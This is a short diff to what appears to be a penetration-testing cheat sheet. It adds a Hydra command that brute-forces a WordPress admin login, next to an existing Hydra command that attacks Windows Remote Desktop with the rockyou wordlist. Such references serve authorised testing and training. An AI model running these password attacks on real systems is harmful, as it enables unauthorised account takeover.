@@ -1941,6 +1941,10 @@ Client, Web and Password Attacks
             
         -   Hydra attack Windows Remote Desktop with rockyou
             `hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip`
+            
+        -   Hydra brute force a Wordpress admin login
+            `hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'`
+
           
 
 -   <span id="_bnmnt83v58wk" class="anchor"><span id="_Toc480741822" class="anchor"></span></span>Password Hash Attacks
